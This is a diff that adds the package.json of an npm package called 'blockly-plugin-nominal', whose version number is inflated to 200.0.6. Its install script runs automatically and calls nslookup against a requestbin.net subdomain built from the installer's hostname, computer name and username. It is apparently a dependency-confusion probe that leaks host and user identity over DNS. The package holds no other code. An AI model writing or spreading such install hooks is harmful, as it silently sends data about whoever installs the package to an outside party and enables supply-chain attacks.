@@ -1,0 +1,11 @@
+{
+  "name": "blockly-plugin-nominal",
+  "version": "200.0.6",
+  "description": "blockly-plugin-nominal: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.blockly-plugin-nominal.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
